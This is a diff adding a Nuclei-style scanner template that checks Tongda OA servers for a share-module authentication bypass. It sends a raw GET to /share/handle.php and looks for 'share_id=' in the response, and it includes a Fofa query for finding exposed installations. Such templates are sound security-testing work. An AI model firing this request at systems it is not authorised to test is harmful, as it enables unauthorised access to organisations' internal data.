@@ -1,0 +1,29 @@
+id: TondaOA_share_authentication_bypass
+
+info:
+  name: TondaOA_share_authentication_bypass
+  author: HK
+  severity: high
+  description: TondaOA share authentication bypass
+  metadata:
+    max-request: 1
+    Fofa-query: app="TDXK-通达OA"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /share/handle.php?module=2&module_id=1 HTTP/1.1
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
+    Host: {{Hostname}}
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+    Connection: close
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - share_id=
